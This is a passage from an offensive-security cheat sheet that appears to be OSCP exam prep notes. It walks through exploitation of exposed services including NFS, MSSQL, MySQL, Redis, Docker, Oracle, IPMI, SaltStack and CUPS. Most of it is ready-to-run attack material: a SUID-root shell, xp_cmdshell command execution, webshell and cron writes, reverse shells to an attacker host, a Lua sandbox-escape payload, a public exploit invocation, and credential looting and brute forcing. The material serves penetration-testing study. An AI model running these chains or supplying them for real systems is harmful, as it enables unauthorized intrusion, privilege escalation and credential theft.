     ├─ root_squash (default) → you write as 'nobody' → limited, but drop an SSH key if a home is exported
     └─ UID mismatch (can't read a file) → create a local user with the file-owner's UID, re-read
```

### Step 1 — Enumerate exports + their options
```bash
showmount -e $IP                                 # list exported folders
nmap -p111,2049 --script "nfs-ls,nfs-showmount,nfs-statfs" $IP   # exports + perms + a dir listing
rpcinfo -p $IP                                   # confirm mountd/nfs are up (needs 111)
cat /etc/exports 2>/dev/null                     # if you later get a shell — shows no_root_squash etc.
```

### Step 2 — Mount + loot (always do this)
```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs -o vers=3,nolock $IP:/export /mnt/nfs      # try vers=3 and vers=4 if one fails
ls -la /mnt/nfs
grep -rniE 'pass|pwd|secret|key|token' /mnt/nfs 2>/dev/null  # sweep for creds
find /mnt/nfs \( -name 'id_rsa' -o -name '*.kdbx' -o -name '*.conf' -o -name '.env' \) 2>/dev/null
```

### Step 3a — `no_root_squash` → ROOT (the big one)
If the export allows root (you can create files owned by root on it), drop a **SUID-root shell** from your box (where you ARE root) and run it on the target as your low-priv foothold user:
```bash
# on KALI (as root), with the share mounted:
cat > /mnt/nfs/x.c <<'EOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); }
EOF
gcc /mnt/nfs/x.c -o /mnt/nfs/rootbash          # compiled binary now sits on the share, owned by root
sudo chmod +s /mnt/nfs/rootbash                 # set the SUID bit (you're root locally, so this sticks)
# on the TARGET (your low-priv shell, in that same exported dir):
./rootbash -p                                   # → id = uid=0(root) 🎉
```
> Needs: (a) a shell on the target already (NFS alone isn't remote code exec — it's a **privesc**), (b) the export mounted on your Kali as root, (c) `no_root_squash` so the SUID bit is honored.

### Step 3b — Writable export (root_squash) → SSH key
If a **user's home** is exported and writable, drop your key:
```bash
mkdir -p /mnt/nfs/.ssh ; cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys ; ssh <user>@$IP
```

### Step 3c — UID mismatch (can't read a file you should)
```bash
ls -la /mnt/nfs            # note the numeric owner UID (e.g. 1001)
sudo useradd -u 1001 tmpuser ; sudo -u tmpuser cat /mnt/nfs/<file>   # read as that UID
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `showmount` → "clnt_create: RPC: Program not registered" | NFS/mountd down, or only NFSv4 → `mount -t nfs4`; check `rpcinfo -p` |
| `mount` → "access denied by server" | export is IP-restricted, or needs `-o vers=3` / `vers=4` |
| can see file but "Permission denied" | UID mismatch → 3c |
| `no_root_squash` SUID binary runs as *you* not root | the export is `root_squash` (default) → 3a won't work; use 3b |

**Leads to:** root (3a) via a foothold you already have; or creds/keys → `[CREDENTIALS-QUICK]`. (Full privesc detail: `[LINUX-NFS]` in Vol 4.)

## [ENUM-MSSQL]  Port 1433 — Microsoft SQL Server — FULL CHAIN  → `[SQLI-MSSQL]`, `[TECH-SQL]`
**What it is:** Microsoft's database. The prize: **`xp_cmdshell`** = run OS commands as the SQL service account (often has **SeImpersonate** → SYSTEM via Potato). Also: **steal/relay** Windows hashes, **impersonate** `sa`, and hop via **linked servers**.

### 🗺️ Decision tree
```
have creds? (or Windows auth / SQLi into MSSQL)
   YES → connect → are you sysadmin?
        ├─ sysadmin → enable + run xp_cmdshell → RCE → (SeImpersonate? → Potato → SYSTEM)
        ├─ NOT sysadmin → can you IMPERSONATE a sysadmin login? → EXEC AS → become sa → xp_cmdshell
        ├─ no impersonation → xp_dirtree/xp_fileexist → capture NetNTLM hash (Responder) → crack/relay
        └─ linked servers? → EXEC on the linked server (often sa there) → RCE/hop
   NO creds → try: sa/blank, sa/sa, found creds, SQLi auth-bypass in a web app → then as above
```

### Step 1 — Identify + test access
```bash
nmap -p1433 -sCV --script "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password" $IP
nxc mssql $IP -u '' -p ''                         # null / blank
nxc mssql $IP -u sa -p ''                         # sa / blank (very common)
nxc mssql $IP -u $U -p $P                         # found creds ; add --local-auth for local SQL logins
nxc mssql $IP -u $U -p $P -q "SELECT @@version"   # quick query to confirm
```
- `(Pwn3d!)` or a successful query → Step 2. No creds → try sa/blank, defaults, or get creds via a web SQLi (`[SQLI-MSSQL]`).

### Step 2 — Connect
```bash
impacket-mssqlclient $U:$P@$IP -windows-auth      # Windows (domain) auth
impacket-mssqlclient $U:$P@$IP                    # SQL auth (local SQL login like 'sa')
# or straight from nxc:  nxc mssql $IP -u $U -p $P -x "whoami"   (runs xp_cmdshell in one go)
```
Check your power:
```
SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1 = you're sysadmin → go straight to RCE
SELECT system_user; SELECT user_name();   -- who am I
```

### Step 3 — RCE via xp_cmdshell (sysadmin)
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;      -- turn it on (impacket: just type: enable_xp_cmdshell)
EXEC xp_cmdshell 'whoami';                            -- RCE as the SQL service account
EXEC xp_cmdshell 'powershell -e <base64-rev-shell>';  -- full reverse shell (nc -lvnp 443) → [SHELL-WINDOWS]
```
→ shell. Then **`whoami /priv`** — SQL service accounts usually have **SeImpersonate** → `[WINDOWS-TOKENS]` → SYSTEM.

### Step 4 — Not sysadmin? Escalate inside MSSQL
```sql
-- find logins you can impersonate:
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXEC AS LOGIN = 'sa';                 -- become sa → now you're sysadmin → Step 3
-- (nxc helper:)  nxc mssql $IP -u $U -p $P -M mssql_priv
```

### Step 5 — No RCE? Steal a hash (relay/crack)
```sql
EXEC xp_dirtree '\\<KALI-IP>\share';        -- forces SQL to auth to YOU
EXEC xp_fileexist '\\<KALI-IP>\share';      -- same idea
```
```bash
# Kali: catch the NetNTLMv2 hash (ANALYZE mode — poisoning is exam-banned, but a direct auth you triggered is fine):
sudo responder -I tun0 -A
# then crack:  hashcat -m 5600 hash.txt rockyou.txt   (or relay to a signing:False host, lab only)
```

### Step 6 — Linked servers (lateral)
```sql
SELECT * FROM master..sysservers;                         -- list linked servers
EXEC ('SELECT @@version; EXEC xp_cmdshell ''whoami''') AT [LINKED\SERVER];   -- run on the linked box (often sa)
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `Login failed for user` | wrong creds/auth type → try `-windows-auth` vs SQL auth; `--local-auth` on nxc |
| `xp_cmdshell` disabled / blocked | `sp_configure` to enable (needs sysadmin) → or Step 4 impersonation |
| not sysadmin, no impersonation | Step 5 (hash capture) or Step 6 (linked servers) |
| hash captured but won't crack | relay it to a `signing:False` host (lab), or move on |
| xp_cmdshell runs but no output back | run a reverse shell instead of relying on returned output |

**Leads to:** RCE as the SQL service account → often **SeImpersonate → SYSTEM** (`[WINDOWS-TOKENS]`); hash capture → crack/relay; linked servers → lateral.

## [ENUM-MYSQL]  Port 3306 — MySQL  → `[SQLI-MYSQL]`
```bash
mysql -h $IP -u root -p                # try passwords: blank, 'root', 'toor'
nmap -p3306 --script mysql-empty-password,mysql-info $IP   # check for a blank root password
#   once inside:  show databases;  use <db>;  show tables;  select * from users;   → app creds/hashes
#   if the account has FILE privilege:
#     SELECT LOAD_FILE('/etc/passwd');                              # read a file off the server
#     SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/sh.php';   # write a webshell
```
**Where it leads:** application creds/hashes (→ spray) and file read/write (→ webshell). UDF RCE if the plugin dir is writable `[LOOK-UP]`.

## [ENUM-POSTGRES]  Port 5432 — PostgreSQL  → `[SQLI-POSTGRES]`
```bash
psql -h $IP -U postgres      # try password: 'postgres' or blank
nxc postgres $IP -u $U -p $P # test creds
#   command execution (superuser, v9.3+):  COPY t FROM PROGRAM 'id';
#   read a file:                           COPY t FROM '/etc/passwd';    [LOOK-UP]
```
**Where it leads:** command execution as the postgres user, file read.

## [ENUM-REDIS]  Port 6379 — Redis (in-memory key-value store) — FULL CHAIN
**What it is:** a fast in-memory key-value DB, **very often exposed with NO authentication.** If you can talk to it you can usually read its data AND write files to disk (→ webshell / SSH key / cron), or **load a module → direct RCE** (Redis ≥ 4.0).

### 🗺️ The decision tree (follow top-to-bottom)
```
connect →  needs a password?        YES → go to [AUTH] below (find/brute the password first)
           NO (unauthenticated)  →  run INFO + CONFIG GET *, then pick an attack:
  ├─ redis_version ≥ 4.0  AND you can CONFIG SET  → A) MODULE-LOAD RCE   ← cleanest, try FIRST
  ├─ you can write files (CONFIG SET dir works)   → B) SSH key   ·   C) cron   ·   D) webshell (if web root known)
  ├─ Debian/Ubuntu packaged redis (Lua present)   → E) Lua sandbox escape (CVE-2022-0543)
  └─ CONFIG locked / nothing writable             → F) LOOT the data (creds/tokens) → reuse elsewhere
ALWAYS also do F (loot) regardless of which attack you use.
```

### Step 1 — Connect & first contact
```bash
redis-cli -h $IP                      # unauthenticated connect (no -a)
redis-cli -h $IP PING                 # PONG = reachable
nmap -p6379 -sCV $IP                  # grabs the version too
# no redis-cli?  nc $IP 6379   then type:  INFO   (Redis speaks plaintext)
```
- Prompt `$IP:6379>` with no password asked = **unauthenticated** ✅ → Step 2.
- `(error) NOAUTH Authentication required.` → needs a password → **[AUTH]** below.

### Step 2 — Enumerate (these facts pick your attack)
```
INFO server                 # redis_version  ← decides module-load (≥4.0) ; also note the OS line
INFO                        # role (master/slave), persistence, connected_clients
CONFIG GET dir              # WHERE it writes files (default /var/lib/redis or /tmp)
CONFIG GET dbfilename       # the save filename (you'll overwrite this)
CONFIG GET *                # everything — look for: requirepass, protected-mode, dir, bind
ACL WHOAMI ; ACL LIST       # Redis 6+ : who am I + what am I allowed to do
MODULE LIST                 # already-loaded modules (a left-behind exploit module = instant RCE)
KEYS *                      # every key → dump for creds/tokens (Step F)
```
**Branch on what you see:**
- `redis_version` **≥ 4.0** + `CONFIG SET` allowed → **A) module-load RCE** (best).
- `CONFIG GET dir` returns a path + `CONFIG SET` works → **B / C / D** file-write attacks.
- `CONFIG SET` → `(error) ... not allowed` / `unknown command 'CONFIG'` → config locked/renamed → **E (Lua)** or **F (loot)**.
- `KEYS *` shows app data → **F) loot** no matter what.

### A) 🚀 Module-load RCE  (Redis ≥ 4.0) — the cleanest shell
```bash
# Kali — rogue server serves a malicious exp.so and makes Redis load it:
git clone https://github.com/n0b0dyCN/redis-rogue-server ; cd redis-rogue-server
python3 redis-rogue-server.py --rhost $IP --rport 6379 --lhost <KALI-IP> --lport 4444
```
> ⚠️ This tool very commonly dies with `UnicodeDecodeError('gb18030', ...)` **right after `Loading module...`** — the module **usually loaded anyway.** Don't re-run it; drive the loaded module directly:
```bash
redis-cli -h $IP
  MODULE LIST                                              # see the 'system' module → it loaded ✅
  system.exec "id"                                         # run a command = RCE
  system.exec "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1'"   # reverse shell (nc -lvnp 4444 first)
# the module ignores junk bytes before output — the command still works.
```
- **Won't load / tool broken?** fixed fork: `git clone https://github.com/Dliv3/redis-rogue-server`
- **Fully manual:** `CONFIG SET dir /tmp ; CONFIG SET dbfilename exp.so ;` get `exp.so` into `/tmp`, then `MODULE LOAD /tmp/exp.so ; system.exec "id"`.
- After shell: `id` — redis custom installs sometimes run as **root** (= done). If a low-priv user → `[LINUX-PRIVESC]`.

### B) 🔑 Write an SSH key  (any version — best when there's NO web, e.g. Blackgate)
```bash
# Kali — make a key, pad it with blank lines (Redis adds metadata around the value):
ssh-keygen -t rsa -f ./redis -N ''
(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt
redis-cli -h $IP flushall                                  # optional: clean the keyspace first
cat key.txt | redis-cli -h $IP -x set sshkey               # load the padded key
redis-cli -h $IP
  CONFIG SET dir /home/<user>/.ssh      # try: /var/lib/redis/.ssh , /home/<user>/.ssh , /root/.ssh
  CONFIG SET dbfilename authorized_keys
  SAVE
# log in:
ssh -i ./redis <user>@$IP
```
> **Which user?** get names from a looted key (`KEYS *`), `/etc/passwd` if you can read it, or try the **redis** user (`/var/lib/redis/.ssh`) → then each `/home/*` → then `/root/.ssh` (only if redis runs as root).

### C) ⏰ Write a cron job  (works if redis writes as root, or into a crontab dir)
```bash
redis-cli -h $IP
  CONFIG SET dir /var/spool/cron/crontabs     # Debian/Ubuntu  (RedHat/CentOS: /var/spool/cron)
  CONFIG SET dbfilename root                   # root's crontab file
  SET x "\n\n* * * * * bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1\n\n"
  SAVE
# nc -lvnp 4444 ; wait up to 60s. (Finicky — the crontab line + newlines must be exact.)
```

### D) 🌐 Write a webshell  (ONLY if a web server exists AND you know its web root)
```bash
redis-cli -h $IP
  CONFIG SET dir /var/www/html         # the real web root (must exist + be writable)
  CONFIG SET dbfilename shell.php
  SET x "<?php system($_GET['c']); ?>"
  SAVE
# curl "http://$IP/shell.php?c=id"
```

### E) 🧪 Lua sandbox escape — CVE-2022-0543  (Debian/Ubuntu packaged Redis)
A distro packaging bug breaks the Lua sandbox → RCE (try when module-load is blocked).
```bash
redis-cli -h $IP eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id","r"); local r = f:read("*a"); f:close(); return r' 0
```
`[LOOK-UP]` the exact `liblua` path on the target if that one errors.

### F) 💰 Loot the data  (ALWAYS — even with no RCE)
```bash
redis-cli -h $IP
  KEYS *                       # list every key
  TYPE <key>                   # then read by type:
  GET <key>                    #  string
  HGETALL <key>                #  hash (often user/session records)
  SMEMBERS <key> ; LRANGE <key> 0 -1
# dump the WHOLE db and grep it:
redis-cli -h $IP --scan | head
redis-cli -h $IP save ; # then read /var/lib/redis/dump.rdb if you get a shell, or:
strings dump.rdb | grep -iE 'pass|user|token|session|secret'
```
App creds/sessions here → **reuse everywhere** (SSH, web, other services) → `[CREDENTIALS-QUICK]`.

### [AUTH] If it demands a password
```bash
redis-cli -h $IP -a '<password>'            # once you have one (ignore the "insecure" warning)
# find the password:
#  - app config / source / .env  (requirepass is usually reused there)
#  - CONFIG GET requirepass      (if any partial access)
#  - brute (last resort):  nmap -p6379 --script redis-brute $IP   |   hydra -P rockyou.txt redis://$IP
```

### 🧯 Troubleshooting
| Symptom | Meaning / fix |
|---|---|
| `NOAUTH Authentication required` | needs a password → **[AUTH]** |
| `CONFIG SET ... not allowed` / `unknown command 'CONFIG'` | config locked (protected-mode) or commands **renamed** → use **E (Lua)** or just **F (loot)** |
| rogue-server `UnicodeDecodeError('gb18030')` | **known tool bug** — module loaded anyway → `redis-cli` → `MODULE LIST` → `system.exec` |
| `MODULE LOAD` → `unknown command` | version **< 4.0** (no modules) → file-write **B/C/D** instead |
| SSH key written but login fails | wrong `dir` (not that user's home) · key not newline-padded · `.ssh`/perms → try another user |
| webshell written, 404 | wrong web root, or no web server on this box → use **B** (SSH key) |
| `--rhost $IP` "Name or service not known" | `$IP` empty in this tab → use the **literal IP** |

**Leads to:** foothold (RCE / SSH login) → `[LINUX-PRIVESC]`; looted creds → spray `[CREDENTIALS-QUICK]`.

## [ENUM-MONGODB]  Port 27017 — MongoDB
```bash
mongosh --host $IP        # or the older:  mongo $IP
#   show dbs ;  use <db> ;  show collections ;  db.users.find()    → dump app users/hashes/tokens (often no auth)
```
**Where it leads:** creds/tokens for the application.

## [ENUM-GIT]  an exposed `.git` folder over HTTP  → `[FOUND-GIT]`
**What it is:** source code + its full history. Repos often contain **hard-coded passwords, API keys, and endpoints** — sometimes in files that were "deleted" but still live in history.
```bash
git-dumper http://$IP/.git ./loot                  # download the whole exposed repo [LOOK-UP] (or: wget -r)
git log -p | grep -iE 'pass|secret|key|token'       # search the ENTIRE history for secrets
git show ; git stash list                           # look at deleted / stashed content
```
**Where it leads:** creds, source to find bugs in, config files with DB/API keys.

## [ENUM-DOCKER]  Ports 2375/2376, or a container you land inside
```bash
docker -H tcp://$IP:2375 ps                                          # is the Docker API exposed with no auth?
docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh   # if yes → mount the host's disk = host root
# if you're INSIDE a container: check /.dockerenv, your capabilities, mounted host paths, and /var/run/docker.sock → escape
```
**Where it leads:** taking over the host from a container (see `[LINUX-PRIVESC]`, Docker/LXD).

## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS)
**What it is:** an Oracle database. It's fiddly and has its own tools. The way in is usually: find a valid **SID** (the database's name), then log in with **default creds** (`scott/tiger`, `system/manager`, `sys/change_on_install`), then get command execution.
```bash
sudo apt install oracle-instantclient  # if sqlplus/odat aren't installed
nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" $IP   # version + guess the SID
odat sidguesser -s $IP -p 1521                     # brute-force the SID (the database name)
odat passwordguesser -s $IP -p 1521 -d <SID>       # guess default username/passwords for that SID
tnscmd10g version -h $IP                            # query the TNS listener directly
sqlplus <user>/<pass>@$IP:1521/<SID>               # log in once you have creds
odat utlfile -s $IP -d <SID> -U <user> -P <pass> --putFile C:\\ shell.exe local.exe   # upload a file (→ RCE)
```
**Where it leads:** with creds → file read/write and command execution as the Oracle service account (often high-priv on Windows → SeImpersonate → SYSTEM). Default creds are the usual foothold.

## [ENUM-VNC]  Port 5900(+) — VNC (remote desktop)
**What it is:** a graphical remote-desktop service (like RDP, cross-platform). Some versions have an auth-bypass; weak/blank passwords are common; a found password often unlocks a desktop already logged in as a privileged user.
```bash
nmap -p5900 --script "vnc-info,realvnc-auth-bypass,vnc-title" $IP   # info + CVE-2006-2369 auth bypass check
vncviewer $IP                                       # connect (prompts for the VNC password)
vncviewer $IP -passwd /path/to/vnc.passwd           # use a captured .vnc password file
# crack a captured VNC password file:  vncpwd vnc.passwd   (or the 'vncdec' tools)
hydra -P rockyou.txt vnc://$IP                       # brute the password (last resort)
```
**Where it leads:** a graphical session (often as an already-logged-in, sometimes admin, user).

## [ENUM-IPMI]  Port 623/UDP — IPMI (server management)
**What it is:** a "lights-out" management interface on server hardware. Its big weakness: **IPMI 2.0 will hand you a password hash for any valid user before you even authenticate** (CVE-2013-4786) → crack it offline.
```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check for the cipher-zero auth bypass
# dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
#   use auxiliary/scanner/ipmi/ipmi_dumphashes    → gives a hashcat -m 7300 (RAKP) hash
hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP hash
# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin
```
**Where it leads:** admin creds for the server's management controller (→ often the OS).

## [ENUM-SALTSTACK]  Ports 4505/4506 — SaltStack (salt-master)
**What it is:** SaltStack is a config-management tool. Its **salt-master** talks to agents over **ZeroMQ** on **4505** (publish) + **4506** (request). Seeing **both** open — nmap labels them `zmtp` / `ZeroMQ ZMTP` — is the dead giveaway. A **salt-api** often runs too (commonly `:8000`, returns JSON). **The salt-master runs as ROOT**, so exploiting it = **instant root, no privesc.**
```bash
nmap -p4505,4506 -sV $IP                 # "ZeroMQ ZMTP 2.0" = SaltStack
# CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → UNAUTH RCE as root
# (vulnerable: Salt < 2019.2.4 / < 3000.2)
git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
pip3 install salt msgpack --break-system-packages        # the PoC needs the salt lib
python3 exploit.py --master $IP --read /root/proof.txt   # read ANY file as root (returns content) — quickest flag
python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'"   # root reverse shell
```
**Gotcha:** `--exec` is **blind** (it schedules the job, shows no output) → use **`--read`** for files, or `--exec` a **reverse shell** to see results. **Leads to:** root (first box: PG **Twiggy**).

## [ENUM-CUPS]  Port 631 (+ 5353/UDP mDNS) — CUPS (Linux printing)
**What it is:** the Linux printing service (IPP). The late-2024 bug chain **CVE-2024-47176 / -47177 / -47076 / -47175** → **unauthenticated RCE**: a crafted IPP request makes `cups-browsed` add an attacker-controlled "printer", and sending a print job to it runs your command.
```bash
nmap -p631 -sCV $IP                  # CUPS/IPP ; also browse http://$IP:631 in a browser
# PoC (IppSec's): https://github.com/ippsec/evil-cups
#   python3 evil-cups.py <KALI-IP> $IP "<command>"     # sets up the rogue printer + payload, triggers it
```
**Note:** real + recent, but **rare on current OSCP** — know it exists, don't expect it. **Leads to:** RCE in the printing context.

## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
When you meet an unknown port, work through these:
1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
2. `nmap -p<port> -sCV --version-intensity 9 $IP` → force harder version detection.
3. Google the banner/version text + "exploit" or "default credentials".
4. Try it as web (`curl`), then as TLS (`openssl s_client -connect $IP:<port>`), then with the service's own client.
5. `searchsploit <product>`. **Treat every listening port as a possible way in.**

---

# [ENUM-DECISION]  "Port X is open → go read this section"
Use your Nmap results, then jump (Ctrl+F the tag):
```
21  FTP        → [ENUM-FTP]      (anonymous? can you upload? version exploit?)
22  SSH        → [ENUM-SSH]      (have creds/keys? otherwise it's a payoff, not a way in)
25  SMTP       → [ENUM-SMTP]     (enumerate usernames)
53  DNS        → [ENUM-DNS]      (zone transfer, AD SRV records)
80/443/8080…   → [WEB-QUICK]     (Volume 2 — always enumerate web fully)
88  KERBEROS   → it's AD! → [AD-QUICK] + [ENUM-KERBEROS]
110/143 POP/IMAP → test creds, loot mailboxes
111 RPC        → showmount → NFS → [ENUM-NFS]
135 MSRPC      → rpcclient user enum → [ENUM-RPC]
139/445 SMB    → [ENUM-SMB] / [SMB-QUICK]
161 SNMP       → snmpwalk → [ENUM-SNMP]
389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
631 CUPS/IPP   → [ENUM-CUPS]  (Linux printing — CVE-2024-4717x RCE, niche)
1433 MSSQL     → [ENUM-MSSQL]
1521 Oracle    → [ENUM-ORACLE]
2049 NFS       → [ENUM-NFS]
3306 MySQL     → [ENUM-MYSQL]
3389 RDP       → [ENUM-RDP]
5432 Postgres  → [ENUM-POSTGRES]
5900 VNC       → [ENUM-VNC]
5985/5986 WinRM → [ENUM-WINRM]
6379 Redis     → [ENUM-REDIS]
27017 Mongo    → [ENUM-MONGODB]
2375 Docker    → [ENUM-DOCKER]
4505/4506 SaltStack → [ENUM-SALTSTACK]  (ZeroMQ = salt-master → unauth root)
anything else  → [ENUM-UNUSUAL-PORTS]
```

---
*End Volume 1. Next: Volume 2 (Web & SQL Injection) — how to break the websites you just found.*
